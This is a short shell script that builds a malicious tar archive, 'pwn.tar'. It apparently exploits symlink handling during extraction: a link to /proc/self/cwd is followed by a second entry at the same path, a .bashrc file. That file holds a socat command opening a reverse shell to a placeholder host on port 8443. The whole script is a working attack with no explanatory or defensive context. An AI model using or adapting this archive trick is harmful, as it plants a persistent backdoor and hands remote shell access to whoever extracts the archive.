#!/bin/sh
 rm -r ./baddir
 rm -r baddir
 rm pwn.tar

 mkdir ./baddir
 ln -sf /proc/self/cwd ./baddir/twist

 tar -cf pwn.tar ./baddir
 
 tar -tvf pwn.tar

 rm ./baddir/twist
 ls ./baddir
 mkdir ./baddir/twist
 touch ./baddir/twist/.bashrc
 echo 'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:x.x.x.x:8443 &' > ./baddir/twist/.bashrc

 tar -r --file pwn.tar ./baddir/twist/.bashrc

echo "[*] Done!"
tar -tvf pwn.tar

